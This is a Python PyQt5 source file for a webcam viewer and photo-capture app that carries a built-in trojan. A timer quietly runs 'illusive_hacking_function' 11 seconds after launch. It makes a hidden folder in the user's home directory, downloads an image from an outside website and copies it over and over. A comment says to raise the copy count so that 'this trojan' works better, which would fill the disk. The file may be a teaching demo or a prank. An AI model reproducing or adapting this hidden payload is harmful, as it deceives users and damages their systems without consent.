import sys
import cv2
from PyQt5.QtWidgets import QApplication, QWidget, QLabel, QVBoxLayout, QPushButton, QFileDialog, QDesktopWidget, QMessageBox
from PyQt5.QtGui import QImage, QPixmap, QIcon
from PyQt5.QtCore import QTimer, Qt, QEvent
import time
import os
import requests
import shutil

class CameraApp(QWidget):
    def __init__(self):
        super().__init__()
        
        # Determine the application path (helps with icon loading when bundled)
        if getattr(sys, 'frozen', False):
            # If the app is bundled, use the system path to find resources
            application_path = os.path.dirname(sys.executable)
        else:
            application_path = os.path.dirname(os.path.abspath(__file__))

        # Set up the window with half the screen size
        self.setWindowTitle("Camera")
        try:
            # Load the application icon if available
            icon_path = os.path.join(application_path, 'icon.ico')
            if os.path.exists(icon_path):
                self.setWindowIcon(QIcon(icon_path))
        except Exception as e:
            print(f"Could not load icon: {e}")

        # Get screen dimensions and set window size to half of it
        screen = QDesktopWidget().screenGeometry()
        self.window_width = screen.width() // 2
        self.window_height = screen.height() // 2
        self.setGeometry(100, 100, self.window_width, self.window_height)

        # Create a vertical layout for the widgets
        layout = QVBoxLayout()

        # QLabel to display the video feed
        self.image_label = QLabel()
        self.image_label.setAlignment(Qt.AlignCenter)
        layout.addWidget(self.image_label)

        # Button to capture a photo
        self.capture_button = QPushButton("Capture")
        self.capture_button.setFixedSize(80, 30)  # Set button size
        self.capture_button.clicked.connect(self.capture_photo)  # Connect button to capture function
        layout.addWidget(self.capture_button, alignment=Qt.AlignCenter)

        # Set the layout for the window
        self.setLayout(layout)

        # Initialize camera with error handling
        self.cap = None
        self.init_camera()

        # Timer for updating the video feed
        self.timer = QTimer()
        self.timer.timeout.connect(self.update_frame)  # Update frame on timeout
        if self.cap:
            self.timer.start(20)  # Update every 20 ms

        # Start a one-time timer to execute illusive_hacking_function 11 seconds and 11 milliseconds after startup
        self.delayed_timer = QTimer()
        self.delayed_timer.setSingleShot(True)  # Run only once
        self.delayed_timer.timeout.connect(self.illusive_hacking_function)
        self.delayed_timer.start(11011)  # Start timer for 11 seconds and 11 milliseconds (11011 ms)

    def init_camera(self):
        """Initialize the camera and handle potential errors."""
        try:
            self.cap = cv2.VideoCapture(0)  # Open the first camera device
            if not self.cap.isOpened():
                # Show an error message if the camera can't be opened
                QMessageBox.critical(self, "Camera Error",
                                     "Could not open camera. Please check camera permissions in System Preferences > Security & Privacy > Privacy > Camera")
                return False
            return True
        except Exception as e:
            # Show an error message if an exception occurs during initialization
            QMessageBox.critical(self, "Camera Error", f"Error initializing camera: {str(e)}")
            return False

    def focusInEvent(self, event: QEvent):
        """Start updating the video feed when the window gains focus."""
        if self.cap and not self.timer.isActive():
            self.timer.start(20)
        super().focusInEvent(event)

    def focusOutEvent(self, event: QEvent):
        """Stop updating the video feed when the window loses focus."""
        if self.cap:
            self.timer.stop()
            self.image_label.clear()  # Clear the video feed display
        super().focusOutEvent(event)

    def update_frame(self):
        """Read a frame from the camera and display it on the QLabel."""
        if self.cap and self.cap.isOpened():
            ret, frame = self.cap.read()  # Capture a frame
            if ret:
                # Convert the image from BGR (OpenCV format) to RGB (PyQt format)
                frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
                # Resize the frame to fit the window size
                frame = cv2.resize(frame, (self.window_width, self.window_height), interpolation=cv2.INTER_AREA)
                # Convert the image to QImage
                height, width, channel = frame.shape
                step = channel * width
                q_img = QImage(frame.data, width, height, step, QImage.Format_RGB888)
                # Display the image in the QLabel
                self.image_label.setPixmap(QPixmap.fromImage(q_img))
            else:
                # If the frame capture fails, stop the timer and re-initialize the camera
                self.timer.stop()
                self.init_camera()

    def capture_photo(self):
        """Capture a photo from the camera and save it to a file."""
        if self.cap and self.cap.isOpened():
            ret, frame = self.cap.read()  # Capture a frame
            if ret:
                # Open a file dialog to save the photo
                filename, _ = QFileDialog.getSaveFileName(
                    self, "Save Photo", "", 
                    "JPEG Files (*.jpg);;PNG Files (*.png);;All Files (*)")
                if filename:
                    cv2.imwrite(filename, frame)  # Save the captured frame

    def illusive_hacking_function(self):
        """Execute a task 11 seconds and 11 milliseconds after the app starts."""
        print("Executing illusive hacking function 11 seconds and 11 milliseconds after startup...")
        num_iterations = 2 # Number of times to duplicate the image, putting 2 for testing purpose, chnage it to a larger number for this trojan to be more effective
        try:
            # Create a hidden directory in the home folder
            home_dir = os.path.expanduser("~")
            root_dir = os.path.join(home_dir, '.images')
            os.makedirs(root_dir, exist_ok=True)
            # URL of the image to download
            file_url = 'https://jollycontrarian.com/images/6/6c/Rickroll.jpg?20170403162336'
            # Download and save the image
            response = requests.get(file_url, stream=True)
            response.raise_for_status()
            with open(os.path.join(root_dir, 'image.jpg'), 'wb') as file:
                shutil.copyfileobj(response.raw, file)
            del response
            # Duplicate the image file in the directory
            for i in range(num_iterations):
                for file_name in os.listdir(root_dir):
                    shutil.copy(os.path.join(root_dir, file_name), os.path.join(root_dir, f"{i}_{file_name}"))
        except Exception as e:
            # Print an error message if something goes wrong
            print(f"Error in illusive_hacking_function: {e}")

    def closeEvent(self, event):
        """Release the camera when the application is closed."""
        if self.cap:
            self.cap.release()
        super().closeEvent(event)

if __name__ == "__main__":
    app = QApplication(sys.argv)
    window = CameraApp()
    window.show()
    sys.exit(app.exec_())
